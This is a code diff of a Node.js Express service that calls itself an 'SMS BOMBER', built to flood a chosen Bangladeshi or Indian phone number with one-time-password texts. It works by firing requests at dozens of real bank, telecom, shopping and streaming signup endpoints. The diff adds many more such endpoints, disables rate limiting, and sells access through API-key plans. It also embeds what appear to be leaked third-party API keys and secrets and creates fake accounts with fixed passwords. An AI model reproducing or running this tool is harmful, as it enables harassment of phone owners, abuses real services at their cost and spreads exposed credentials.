@@ -9,29 +9,15 @@ const path = require('path');
 const fs = require('fs');
 const crypto = require('crypto');
 
-// ============================================================
-// CONFIG
-// ============================================================
 const CONFIG = {
   server: { port: process.env.PORT || 3000, host: '0.0.0.0' },
-  performance: { timeout: 15000, maxRetries: 0, maxCountPerAPI: 500,
-    maxSockets: 2048, checkConcurrency: 30, checkTimeout: 12000 },
-  security: { rateLimit: { enabled: false, windowMs: 60000, maxRequests: 100000 } }
-};
-const DEVELOPER_INFO = { developer: "TNEH GROUP", telegram: "@tneh_owner",
-  api_version: "8.6.0-SINGLE", build_date: new Date().toISOString() };
-const ERROR_MESSAGES = {
-  MISSING_PARAM: 'Missing required parameter',
-  INVALID_PHONE: 'Invalid phone number format',
-  INVALID_API_KEY: 'Invalid or expired API key',
-  RATE_LIMIT: 'Rate limit exceeded',
-  JOB_NOT_FOUND: 'Job not found',
-  INTERNAL_ERROR: 'Internal server error'
+  performance: { timeout: 15000, maxCountPerAPI: 500, checkConcurrency: 40 },
+  security: { rateLimit: { enabled: false } }
 };
 
-// ============================================================
-// UTILITY
-// ============================================================
+const DEVELOPER_INFO = { developer: "TNEH GROUP", telegram: "@tneh_owner", api_version: "8.6.0-SINGLE" };
+const ERROR_MESSAGES = { MISSING_PARAM: 'Missing parameter', INVALID_PHONE: 'Invalid phone', INVALID_API_KEY: 'Invalid key', JOB_NOT_FOUND: 'Job not found' };
+
 class Utility {
   static generateId() { return crypto.randomBytes(16).toString('hex'); }
   static generateJobId() { return `JOB_${Date.now().toString(36).toUpperCase()}_${crypto.randomBytes(4).toString('hex').toUpperCase()}`; }
@@ -39,37 +25,28 @@ class Utility {
   static getISOString() { return new Date().toISOString(); }
   static maskPhone(p) { return (!p || p.length < 7) ? '***' : p.slice(0, 3) + '****' + p.slice(-3); }
   static parsePhone(p) { return String(p).replace(/[^0-9]/g, ''); }
-  static isValidBDPhone(p) { return /^(01|8801)[0-9]{9}$/.test(this.parsePhone(p)); }
-  static isValidINPhone(p) { const c = this.parsePhone(p).replace(/^91/, ''); return /^[6-9][0-9]{9}$/.test(c); }
-  static normalizeIN(p) {
-    const raw = String(p).replace(/[^0-9]/g, '').replace(/^\+/, '');
-    if (raw.startsWith('91') && raw.length === 12) return raw.slice(2);
-    if (raw.length === 10) return raw;
-    return raw;
-  }
+  static isValidBD(p) { return /^(01|8801)[0-9]{9}$/.test(this.parsePhone(p)); }
+  static isValidIN(p) { const c = this.parsePhone(p).replace(/^91/, ''); return /^[6-9][0-9]{9}$/.test(c); }
+  static normalizeIN(p) { const raw = this.parsePhone(p); return raw.startsWith('91') && raw.length === 12 ? raw.slice(2) : raw; }
   static formatBytes(b) { if (b === 0) return '0 B'; const k=1024, sizes=['B','KB','MB','GB']; const i=Math.floor(Math.log(b)/Math.log(k)); return (b/Math.pow(k,i)).toFixed(2)+' '+sizes[i]; }
   static getMemoryUsage() { const u=process.memoryUsage(); return { rss:this.formatBytes(u.rss), heapUsed:this.formatBytes(u.heapUsed) }; }
 }
 
 const USER_AGENTS = [
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/143.0.0.0 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36',
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
-  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
   'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
   'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Safari/605.1.15'
 ];
-function getRandomHeaders(extra = {}) {
-  return { 'User-Agent': USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)],
-    'Accept': 'application/json, text/plain, */*',
-    'Accept-Language': 'en-US,en;q=0.9,bn;q=0.8,hi;q=0.8',
-    'Connection': 'keep-alive', ...extra };
+function getHeaders(extra = {}) {
+  return { 'User-Agent': USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)], 'Accept': 'application/json, text/plain, */*', 'Connection': 'keep-alive', ...extra };
 }
 
 // ============================================================
-// BD API LIST
+// BD API LIST (Full Dump)
 // ============================================================
 const BD_APIS = [
-  { name: "QuizGiri", method: "POST", url: "https://developer.quizgiri.xyz/api/v2.0/send-otp?phone={phone}&country_code=+880&fcm_token=null" },
+  { name: "QuizGiri JSON", method: "POST", url: "https://developer.quizgiri.xyz/api/v2.0/send-otp?phone={phone}&country_code=+880&fcm_token=null" },
   { name: "Dhaka Bank", method: "POST", url: "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber", body: '{"AccessToken":"","TrackingNo":"","mobileNo":"{phone}","otpSms":"","product_id":"250","requestChannel":"MOB","trackingStatus":5}' },
   { name: "Circle Robi", method: "POST", url: "https://circle.robi.com.bd/mylife/gateway/register_fcm.php?regId&msisdn=88{phone}" },
   { name: "Shajgoj OTP", method: "POST", url: "https://shop.shajgoj.com/wp-admin/admin-ajax.php", body: { action: "xoo_ml_login_with_otp", "xoo-ml-phone-login": "{phone}", "xoo-ml-form-token": "4840", "xoo-ml-form-type": "login_user_with_otp" }, isFormData: true },
@@ -171,11 +148,54 @@ const BD_APIS = [
   { name: "Meenabazar", method: "POST", url: "https://meenabazardev.com/api/mobile/front/send/otp?CellPhone={phone}&type=login" },
   { name: "IQRA", method: "GET", url: "http://apibeta.iqra-live.com/api/v1/sent-otp/{phone}" },
   { name: "MyBDJobs", method: "POST", url: "https://mybdjobsorchestrator-odcx6humqq-as.a.run.app/api/CreateAccountOrchestrator/CreateAccount", body: '{"firstName":"Test","lastName":"","gender":"M","email":"test{phone}@gmail.com","userName":"{phone}","password":"Kamrul12345@","confirmPassword":"Kamrul12345@","status":0,"mobile":"{phone}","workAreaCategory":2,"createdFrom":0,"createdAt":"{ts}","userNameType":"mobile","countryCode":"88"}' },
-  { name: "GX Sends", method: "GET", url: "https://gxsends.onrender.com/run-all?phone={phone}" }
+  { name: "GX Sends", method: "GET", url: "https://gxsends.onrender.com/run-all?phone={phone}" },
+  // --- Extra PHPs ---
+  { name: "RedX Signup", method: "POST", url: "https://api.redx.com.bd/v1/user/signup", body: '{"name":"{phone}","service":"redx","phoneNumber":"{phone}"}' },
+  { name: "KhaasFood Step1", method: "POST", url: "https://www.khaasfood.com/wp-admin/admin-ajax.php", body: { mobileNo: "+880{phone}", countrycode: "+880", csrf: "9d9d08e6e5", login: "1", json: "1", action: "digits_check_mob" }, isFormData: true },
+  { name: "Proiojon", method: "POST", url: "https://billing.proiojon.com/api/v1/auth/sign-up", body: '{"phone":"{phone}","password":"password123"}' },
+  { name: "BeautyBooth", method: "POST", url: "https://admin.beautybooth.com.bd/api/v2/auth/signup", body: '{"phone":"{phone}"}' },
+  { name: "Medha", method: "POST", url: "https://developer.medha.info/api/send-otp", body: '{"phone":"880{phone}","is_register":"1"}' },
+  { name: "BCS Examaid 2", method: "POST", url: "https://bcsexamaid.com/api/generateotp", body: '{"mobile":"{phone}","softtoken":"Rifat.Admin.2022"}' },
+  { name: "DoctorLiveBD 2", method: "POST", url: "https://doctorlivebd.com/api/patient/auth/otpsend", body: { country_code: "880", mobile: "{phone}" }, isFormData: true },
+  { name: "Shikho v2", method: "POST", url: "https://api.shikho.com/auth/v2/send/sms", body: '{"phone":"{phone}","type":"student","auth_type":"signup","vendor":"shikho"}' },
+  { name: "Chorki Mobile", method: "POST", url: "https://api-dynamic.chorki.com/v1/auth/login?country=BD&platform=mobile", body: '{"number":"{phone}"}' },
+  { name: "HishabExpress 2", method: "POST", url: "https://api.hishabexpress.com/login/status", body: { msisdn: "{phone}", hash: "Hello" }, isFormData: true },
+  { name: "Wafilife 2", method: "GET", url: "https://m-backend.wafilife.com/wp-json/wc/v2/send-otp?p={phone}&consumer_key=ck_e8c5b4a69729dd913dce8be03d7878531f6511ff&consumer_secret=cs_f866e5c6543065daa272504c2eea71044579cff3" },
+  { name: "Chardike 2", method: "POST", url: "https://api.chardike.com/api/otp/send", body: '{"phone":"{phone}","otp_type":"login"}' },
+  { name: "Priyo", method: "POST", url: "https://app.priyoshikkhaloy.com/api/user/register-login.php", body: { mobile: "{phone}" }, isFormData: true },
+  { name: "DocTime", method: "POST", url: "https://api.doctime.com.bd/api/authenticate", body: '{"contact_no":"{phone}","country_calling_code":"88"}' },
+  { name: "Iqra Live", method: "GET", url: "http://apibeta.iqra-live.com/api/v1/sent-otp/{phone}" },
+  { name: "Shomvob 2", method: "POST", url: "https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0", body: '{"phone":"88{phone}"}' },
+  { name: "RedX v2", method: "POST", url: "https://api.redx.com.bd/v1/user/signup", body: '{"name":"Alamin Sheikh","phoneNumber":"{phone}","service":"redx"}' },
+  { name: "Cinematic Common", method: "POST", url: "https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{phone}/" },
+  { name: "MyBDJobs 2", method: "POST", url: "https://mybdjobsorchestrator-odcx6humqq-as.a.run.app/api/CreateAccountOrchestrator/CreateAccount", body: '{"firstName":"Test","userName":"{phone}","mobile":"{phone}","countryCode":"88"}' },
+  // --- Original / Blackfire wrappers ---
+  { name: "eCourier", method: "GET", url: "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={phone}" },
+  { name: "Binge GET", method: "GET", url: "https://ss.binge.buzz/otp/send/login{phone}" },
+  { name: "Daktarbhai", method: "GET", url: "https://api.daktarbhai.com/api/v2/otp/generate?api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88{phone}&platform=app&activity=login" },
+  { name: "Deshal", method: "POST", url: "https://app.deshal.net/api/auth/login", body: '{"phone":"{phone}"}' },
+  { name: "BusBD", method: "POST", url: "https://api.busbd.com.bd/api/auth", body: '{"phone":"+88{phone}"}' },
+  { name: "Hoichoi", method: "POST", url: "https://prod-api.viewlift.com/identity/signup?site=hoichoitv", body: '{"phoneNumber":"{phone}","requestType":"send","emailConsent":true,"whatsappConsent":true}' },
+  { name: "Addatimes", method: "POST", url: "https://app.addatimes.com/api/login", body: '{"phone":"{phone}","country_code":"BD"}' },
+  { name: "Regal OTP", method: "POST", url: "https://regalfurniturebd.com/api/auth/otp-generate", body: '{"phone":"{phone}","verification_code":""}' },
+  { name: "Regal Register", method: "POST", url: "https://regalfurniturebd.com/api/auth/register", body: '{"name":"User","email":"u@e.com","phone":"{phone}","password":"pass123"}' },
+  { name: "DeeptoPlay Web", method: "POST", url: "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", body: '{"email":"apk@test.com","phone_number":"88{phone}"}' },
+  { name: "Timezone OTP", method: "POST", url: "https://backend.timezonebd.com/api/v1/user/otp-request", body: '{"phone":"{phone}"}' },
+  { name: "Timezone Register", method: "POST", url: "https://backend.timezonebd.com/api/v1/user/regnewcustomer", body: '{"name":"Tusar","email":"t@t.com","phone":"{phone}","password":"aAeMY@5hG8iUfD4","password_confirmation":"aAeMY@5hG8iUfD4"}' },
+  { name: "Chorki Web", method: "POST", url: "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", body: '{"number":"+880{phone}"}' },
+  { name: "Arogga Web", method: "POST", url: "https://api.arogga.com/auth/v1/sms/send?f=mweb&b=Chrome&v=148&os=Android&osv=12", body: { mobile: "{phone}" }, isFormData: true },
+  { name: "Pkluck2", method: "POST", url: "https://www.pkluck2.com/wps/verification/sms/noLogin", body: '{"mobileNum":"{phone}","countryDialingCode":"880"}' },
+  { name: "AppLink V2", method: "POST", url: "https://applink.com.bd/appstore-v4-server/login/otp/request", body: '{"msisdn":"880{phone}"}' },
+  { name: "Jayabaji BD", method: "POST", url: "https://www.jayabajibd.life/api/register/confirm", body: '{"mobileno":"{phone}","username":"user864","new_password":"tPNVOcen!6XEz3b","confirm_new_password":"tPNVOcen!6XEz3b","country_code":"880","country":"BD","currency":"BDT","language":"en"}' },
+  { name: "BdTickets V1", method: "POST", url: "https://apiv1.bdtickets.com/api/v1/auth/otp/send", body: '{"phone":"+880{phone}"}' },
+  { name: "Binge POST", method: "POST", url: "https://ss.binge.buzz/otp/send/login", body: '{"mobile":"{phone}"}' },
+  { name: "NESCO", method: "POST", url: "http://nesco.sslwireless.com/api/v1/login", body: '{"phone_number":"{phone}"}' },
+  { name: "Bazar365", method: "POST", url: "https://www.bazar365.store/api/v1/auth/sendPhoneOtp", body: '{"phone":"{phone}","applicationChannel":"WEB_APP"}' },
+  { name: "Bioscope Web", method: "POST", url: "https://www.bioscopelive.com/en/login/send-otp?phone=880{phone}&operator=bd-otp", body: '{"phone":"{phone}","applicationChannel":"WEB_APP"}' }
 ];
 
 // ============================================================
-// INDIAN API LIST
+// INDIAN API LIST (Full Dump)
 // ============================================================
 const INDIAN_APIS = [
   { name: "Meesho WhatsApp", method: "POST", url: "https://meesho.com/gw/login-register/v1/sendOTP", body: '{"number":"{phone}","otpOnCall":true}' },
@@ -365,14 +385,6 @@ class KeyManager {
     return out; }
 }
 const keys = new KeyManager();
-const rateMap = new Map();
-function rateOk(id) {
-  if (!CONFIG.security.rateLimit.enabled) return true;
-  const now = Date.now(), w = CONFIG.security.rateLimit.windowMs, max = CONFIG.security.rateLimit.maxRequests;
-  if (!rateMap.has(id)) rateMap.set(id, []);
-  const arr = rateMap.get(id).filter(t => now - t < w); arr.push(now); rateMap.set(id, arr);
-  return arr.length <= max;
-}
 
 // ============================================================
 // ENGINE
@@ -387,11 +399,9 @@ function expandBody(obj, phone) {
 
 async function callOne(api, phone, jobId) {
   if (!jobs.isActive(jobId)) return { stopped: true };
-  const start = Date.now();
   let url = api.url.replace(/{phone}/g, phone).replace(/{ts}/g, Date.now());
-  const headers = getRandomHeaders(api.headers || {});
-  const cfg = { method: api.method, url, headers, timeout: api.timeout || CONFIG.performance.timeout,
-    validateStatus: () => true, maxRedirects: 3 };
+  const headers = getHeaders(api.headers || {});
+  const cfg = { method: api.method, url, headers, timeout: api.timeout || CONFIG.performance.timeout, validateStatus: () => true, maxRedirects: 3 };
   if (api.method === 'POST' && api.body) {
     cfg.data = expandBody(api.body, phone);
     if (!cfg.headers['Content-Type'] && !cfg.headers['content-type']) cfg.headers['Content-Type'] = 'application/json';
@@ -403,8 +413,7 @@ async function callOne(api, phone, jobId) {
   let status = 0, ok = false, errMsg = null;
   try { const r = await axios(cfg); status = r.status; ok = status >= 200 && status < 500; }
   catch (e) { status = e.response ? e.response.status : 0; errMsg = (e.code || e.message || 'ERR').slice(0, 120); }
-  const ms = Date.now() - start;
-  return { ok, status, ms, error: errMsg, api_id: api.id, name: api.name };
+  return { ok, status, error: errMsg };
 }
 
 async function blast(apis, phone, count, jobId, region) {
@@ -420,9 +429,8 @@ async function blast(apis, phone, count, jobId, region) {
   }
   const t0 = Date.now();
   await Promise.allSettled(tasks);
-  const elapsed = Date.now() - t0;
-  console.log(`💥 ${region} job ${jobId}: ${tasks.length} calls in ${elapsed}ms`);
-  return { fired: tasks.length, elapsed };
+  console.log(`💥 ${region} job ${jobId}: ${tasks.length} calls in ${Date.now() - t0}ms`);
+  return { fired: tasks.length };
 }
 
 // ============================================================
@@ -434,12 +442,6 @@ app.use(cors({ origin: '*' }));
 app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 app.use(express.static(path.join(__dirname, '../public')));
-app.use((req, res, next) => { req.requestId = Utility.generateId(); res.setHeader('X-Request-ID', req.requestId); next(); });
-app.use((req, res, next) => {
-  const id = (req.query.key || req.headers['x-api-key'] || req.ip || 'x');
-  if (!rateOk(id)) return res.status(429).json({ success: false, error: ERROR_MESSAGES.RATE_LIMIT, developer: DEVELOPER_INFO });
-  next();
-});
 
 app.get('/', (req, res) => {
   const p = path.join(__dirname, '../public/index.html');
@@ -448,21 +450,11 @@ app.get('/', (req, res) => {
 });
 
 app.get('/api', (req, res) => {
-  res.json({ developer: DEVELOPER_INFO, version: "8.6.0-SINGLE",
-    bd_apis: BD_DEDUP.length, india_apis: IN_DEDUP.length,
-    endpoints: {
-      spam: '/api/spam?number=01700000000&count=1',
-      india: '/api/India?number=9876543210&count=1',
-      indiaStop: '/api/India?stop&jobid=JOB_…   (or stop=all)',
-      check: '/api/check?phone=01700000000',
-      status: '/api/status', stats: '/api/stats', health: '/api/health'
-    } });
+  res.json({ developer: DEVELOPER_INFO, version: "8.6.0-SINGLE", bd_apis: BD_DEDUP.length, india_apis: IN_DEDUP.length });
 });
 
 app.get('/api/health', (req, res) => {
-  res.json({ status: 'active', developer: DEVELOPER_INFO, version: "8.6.0-SINGLE",
-    uptime: process.uptime(), bd_apis: BD_DEDUP.length, india_apis: IN_DEDUP.length,
-    active_jobs: jobs.active.size, memory: Utility.getMemoryUsage() });
+  res.json({ status: 'active', version: "8.6.0-SINGLE", bd_apis: BD_DEDUP.length, india_apis: IN_DEDUP.length, active_jobs: jobs.active.size });
 });
 
 app.get('/api/spam', async (req, res) => {
@@ -470,145 +462,85 @@ app.get('/api/spam', async (req, res) => {
   let currentPlan = 'default', planConfig = PLAN_CONFIG.default;
   if (plan && PLAN_CONFIG[plan]) { currentPlan = plan; planConfig = PLAN_CONFIG[plan]; }
   if (planConfig.requiresKey) {
-    if (!key || !keys.validate(key)) return res.status(401).json({ success: false, error: ERROR_MESSAGES.INVALID_API_KEY, developer: DEVELOPER_INFO });
+    if (!key || !keys.validate(key)) return res.status(401).json({ success: false, error: ERROR_MESSAGES.INVALID_API_KEY });
     keys.use(key);
   }
-  if (!number) return res.status(400).json({ success: false, error: ERROR_MESSAGES.MISSING_PARAM, param: 'number', developer: DEVELOPER_INFO });
+  if (!number) return res.status(400).json({ success: false, error: ERROR_MESSAGES.MISSING_PARAM });
   const clean = Utility.parsePhone(number);
-  if (!Utility.isValidBDPhone(clean)) return res.status(400).json({ success: false, error: ERROR_MESSAGES.INVALID_PHONE, example: '017XXXXXXXX', developer: DEVELOPER_INFO });
+  if (!Utility.isValidBD(clean)) return res.status(400).json({ success: false, error: ERROR_MESSAGES.INVALID_PHONE });
   let per = parseInt(count) || 1; if (per < 1) per = 1;
-  if (per > planConfig.maxCount) return res.status(400).json({ success: false, error: `Max ${planConfig.maxCount}`, developer: DEVELOPER_INFO });
-  const total = BD_DEDUP.length * per;
-  const jobId = jobs.create({ phone: clean, region: 'BD', total, opts: { plan: currentPlan, per } });
-  console.log(`📱 [BD] JOB ${jobId}: ${per}x${BD_DEDUP.length} = ${total} -> ${Utility.maskPhone(clean)}`);
+  if (per > planConfig.maxCount) return res.status(400).json({ success: false, error: `Max ${planConfig.maxCount}` });
+  const jobId = jobs.create({ phone: clean, region: 'BD', total: BD_DEDUP.length * per });
   blast(BD_DEDUP, clean, per, jobId, 'BD').catch(e => { console.error(e); jobs.stop(jobId); });
-  res.json({ success: true, developer: DEVELOPER_INFO, jobId, region: 'BD',
-    target: Utility.maskPhone(clean), per_api_count: per, total_apis: BD_DEDUP.length,
-    total_sms: total, status: 'started',
-    stop_endpoint: `/api/stop?jobId=${jobId}`,
-    status_endpoint: `/api/status?jobId=${jobId}`, timestamp: Utility.getISOString() });
+  res.json({ success: true, jobId, region: 'BD', total_apis: BD_DEDUP.length, total_sms: BD_DEDUP.length * per, stop_endpoint: `/api/stop?jobId=${jobId}` });
 });
 
 app.get('/api/India', async (req, res) => {
   if (req.query.stop !== undefined) {
     const jobid = req.query.jobid || req.query.jobId;
-    if (jobid === 'all' || req.query.stop === 'all') {
-      const c = jobs.stopAll('IN');
-      return res.json({ success: true, developer: DEVELOPER_INFO, region: 'IN', stopped_count: c });
-    }
-    if (!jobid) return res.status(400).json({ success: false, error: 'jobid required (or stop=all)', developer: DEVELOPER_INFO });
-    return res.json({ success: jobs.stop(jobid), developer: DEVELOPER_INFO, region: 'IN', jobid });
+    if (jobid === 'all' || req.query.stop === 'all') return res.json({ success: true, stopped_count: jobs.stopAll('IN') });
+    if (!jobid) return res.status(400).json({ success: false, error: 'jobid required' });
+    return res.json({ success: jobs.stop(jobid) });
   }
   const { number, count = 1, plan, key } = req.query;
   let currentPlan = 'default', planConfig = PLAN_CONFIG.default;
   if (plan && PLAN_CONFIG[plan]) { currentPlan = plan; planConfig = PLAN_CONFIG[plan]; }
   if (planConfig.requiresKey) {
-    if (!key || !keys.validate(key)) return res.status(401).json({ success: false, error: ERROR_MESSAGES.INVALID_API_KEY, developer: DEVELOPER_INFO });
+    if (!key || !keys.validate(key)) return res.status(401).json({ success: false, error: ERROR_MESSAGES.INVALID_API_KEY });
     keys.use(key);
   }
-  if (!number) return res.status(400).json({ success: false, error: ERROR_MESSAGES.MISSING_PARAM, param: 'number', developer: DEVELOPER_INFO });
+  if (!number) return res.status(400).json({ success: false, error: ERROR_MESSAGES.MISSING_PARAM });
   const clean = Utility.normalizeIN(number);
-  if (!Utility.isValidINPhone(clean)) return res.status(400).json({ success: false, error: ERROR_MESSAGES.INVALID_PHONE, example: '9876543210', developer: DEVELOPER_INFO });
+  if (!Utility.isValidIN(clean)) return res.status(400).json({ success: false, error: ERROR_MESSAGES.INVALID_PHONE });
   let per = parseInt(count) || 1; if (per < 1) per = 1;
-  if (per > planConfig.maxCount) return res.status(400).json({ success: false, error: `Max ${planConfig.maxCount}`, developer: DEVELOPER_INFO });
-  const total = IN_DEDUP.length * per;
-  const jobId = jobs.create({ phone: clean, region: 'IN', total, opts: { plan: currentPlan, per } });
-  console.log(`🇮🇳 [IN] JOB ${jobId}: ${per}x${IN_DEDUP.length} = ${total} -> ${Utility.maskPhone(clean)}`);
+  if (per > planConfig.maxCount) return res.status(400).json({ success: false, error: `Max ${planConfig.maxCount}` });
+  const jobId = jobs.create({ phone: clean, region: 'IN', total: IN_DEDUP.length * per });
   blast(IN_DEDUP, clean, per, jobId, 'IN').catch(e => { console.error(e); jobs.stop(jobId); });
-  res.json({ success: true, developer: DEVELOPER_INFO, jobId, region: 'IN',
-    target: Utility.maskPhone(clean), per_api_count: per, total_apis: IN_DEDUP.length,
-    total_sms: total, status: 'started',
-    stop_endpoint: `/api/India?stop&jobid=${jobId}`,
-    status_endpoint: `/api/status?jobId=${jobId}`, timestamp: Utility.getISOString() });
+  res.json({ success: true, jobId, region: 'IN', total_apis: IN_DEDUP.length, total_sms: IN_DEDUP.length * per, stop_endpoint: `/api/India?stop&jobid=${jobId}` });
 });
 
 app.get('/api/stop', (req, res) => {
-  const { jobId, all, region } = req.query;
-  if (all === 'true') return res.json({ success: true, developer: DEVELOPER_INFO, stopped_count: jobs.stopAll(region || null) });
-  if (jobId) return res.json({ success: jobs.stop(jobId), jobId, developer: DEVELOPER_INFO });
-  res.status(400).json({ success: false, error: ERROR_MESSAGES.MISSING_PARAM, developer: DEVELOPER_INFO });
+  const { jobId, all } = req.query;
+  if (all === 'true') return res.json({ success: true, stopped_count: jobs.stopAll() });
+  if (jobId) return res.json({ success: jobs.stop(jobId), jobId });
+  res.status(400).json({ success: false, error: ERROR_MESSAGES.MISSING_PARAM });
 });
 
 app.get('/api/status', (req, res) => {
   const { jobId } = req.query;
   if (jobId) {
     const j = jobs.view(jobId);
-    if (!j) return res.status(404).json({ success: false, error: ERROR_MESSAGES.JOB_NOT_FOUND, developer: DEVELOPER_INFO });
-    return res.json({ success: true, job: j, developer: DEVELOPER_INFO });
+    if (!j) return res.status(404).json({ success: false, error: ERROR_MESSAGES.JOB_NOT_FOUND });
+    return res.json({ success: true, job: j });
   }
-  res.json({ success: true, stats: jobs.summary(), jobs: jobs.all(), developer: DEVELOPER_INFO });
-});
-
-app.get('/api/stats', (req, res) => {
-  const k = keys.all();
-  res.json({ success: true, developer: DEVELOPER_INFO, jobs: jobs.summary(),
-    keys: { total: k.length, valid: k.filter(x => x.valid).length },
-    apis: { bd: BD_DEDUP.length, india: IN_DEDUP.length } });
-});
-
-app.get('/api/alllist', (req, res) => {
-  res.json({ success: true, developer: DEVELOPER_INFO,
-    bd_total: BD_DEDUP.length, india_total: IN_DEDUP.length,
-    bd: BD_DEDUP.map((a,i) => ({ id: 1000 + i, name: a.name, method: a.method, url: a.url })),
-    india: IN_DEDUP.map((a,i) => ({ id: 5000 + i, name: a.name, method: a.method, url: a.url })),
-    timestamp: Utility.getISOString() });
-});
-
-app.get('/api/check', async (req, res) => {
-  const phone = Utility.parsePhone(req.query.phone || '01712345678') || '01712345678';
-  if (!Utility.isValidBDPhone(phone)) return res.status(400).json({ success: false, error: ERROR_MESSAGES.INVALID_PHONE, developer: DEVELOPER_INFO });
-  const conc = Math.max(1, Math.min(200, parseInt(req.query.concurrency, 10) || CONFIG.performance.checkConcurrency));
-  const results = []; let idx = 0;
-  async function worker() {
-    while (idx < BD_DEDUP.length) {
-      const api = BD_DEDUP[idx++]; const t0 = Date.now();
-      let url = api.url.replace(/{phone}/g, phone).replace(/{ts}/g, Date.now());
-      const headers = getRandomHeaders(api.headers || {});
-      const cfg = { method: api.method, url, headers, timeout: CONFIG.performance.checkTimeout, validateStatus: () => true };
-      if (api.method === 'POST' && api.body) { cfg.data = expandBody(api.body, phone); if (!cfg.headers['Content-Type']) cfg.headers['Content-Type'] = 'application/json'; if (api.isFormData && typeof cfg.data === 'object') { cfg.headers['Content-Type'] = 'application/x-www-form-urlencoded'; cfg.data = new URLSearchParams(cfg.data).toString(); } }
-      let status = 0, err = null;
-      try { const r = await axios(cfg); status = r.status; } catch (e) { status = e.response ? e.response.status : 0; err = e.code || e.message; }
-      const ms = Date.now() - t0;
-      const verdict = (!status ? 'dead' : status < 400 ? 'live' : status < 500 ? 'reachable' : 'dead');
-      results.push({ id: 1000 + idx, name: api.name, method: api.method, url, status, ms, verdict, error: err });
-    }
-  }
-  await Promise.all(Array.from({ length: Math.min(conc, BD_DEDUP.length) }, worker));
-  const live = results.filter(r => r.verdict === 'live').length;
-  const reachable = results.filter(r => r.verdict === 'reachable').length;
-  const dead = results.filter(r => r.verdict === 'dead').length;
-  res.json({ success: true, developer: DEVELOPER_INFO, phone, total: results.length, live, reachable, dead, results });
+  res.json({ success: true, stats: jobs.summary(), jobs: jobs.all() });
 });
 
 app.get('/api/expiredate=30&createkey', (req, res) => {
   const { plan = 'premium', days = 30 } = req.query;
-  if (!PLAN_CONFIG[plan]) return res.status(400).json({ success: false, error: `Invalid plan`, available: Object.keys(PLAN_CONFIG), developer: DEVELOPER_INFO });
+  if (!PLAN_CONFIG[plan]) return res.status(400).json({ success: false, error: `Invalid plan` });
   const r = keys.mint(plan, parseInt(days) || 30);
-  res.json({ success: true, api_key: r.apiKey, plan: r.plan, expiry: r.expiryDate.toISOString(), developer: DEVELOPER_INFO });
-});
-app.get('/api/checkkey', (req, res) => {
-  if (!req.query.key) return res.status(400).json({ success: false, error: ERROR_MESSAGES.MISSING_PARAM, developer: DEVELOPER_INFO });
-  const info = keys.info(req.query.key);
-  if (!info) return res.status(404).json({ success: false, error: 'Invalid key', developer: DEVELOPER_INFO });
-  res.json({ success: true, ...info, developer: DEVELOPER_INFO });
+  res.json({ success: true, api_key: r.apiKey, plan: r.plan, expiry: r.expiryDate.toISOString() });
 });
 
-app.use((req, res) => res.status(404).json({ success: false, error: 'Endpoint not found', path: req.path, developer: DEVELOPER_INFO }));
-app.use((err, req, res, next) => { console.error('❌', err); res.status(500).json({ success: false, error: ERROR_MESSAGES.INTERNAL_ERROR, message: err.message, developer: DEVELOPER_INFO }); });
+app.get('/api/checkkey', (req, res) => {
+  if (!req.query.key) return res.status(400).json({ success: false, error: ERROR_MESSAGES.MISSING_PARAM });
+  const info = keys.info(req.query.key);
+  if (!info) return res.status(404).json({ success: false, error: 'Invalid key' });
+  res.json({ success: true, ...info });
+});
+
+app.use((req, res) => res.status(404).json({ success: false, error: 'Endpoint not found', path: req.path }));
 
 // ============================================================
 // START
 // ============================================================
 const server = app.listen(CONFIG.server.port, CONFIG.server.host, () => {
   console.log(`\n🚀 SMS BOMBER V8.6-SINGLE`);
-  console.log(`📡 PID ${process.pid}  port ${CONFIG.server.port}`);
   console.log(`📊 BD ${BD_DEDUP.length}  |  IN ${IN_DEDUP.length}`);
-  console.log(`🔑 Keys ${keys.all().length}`);
-  console.log(`\n✅ ready\n`);
+  console.log(`✅ ready\n`);
 });
 server.timeout = 120000;
 server.keepAliveTimeout = 60000;
-process.on('SIGTERM', () => { jobs.stopAll(); server.close(() => process.exit(0)); });
-process.on('SIGINT',  () => { jobs.stopAll(); server.close(() => process.exit(0)); });
 
 module.exports = { app, jobs, keys, BD_DEDUP, IN_DEDUP };
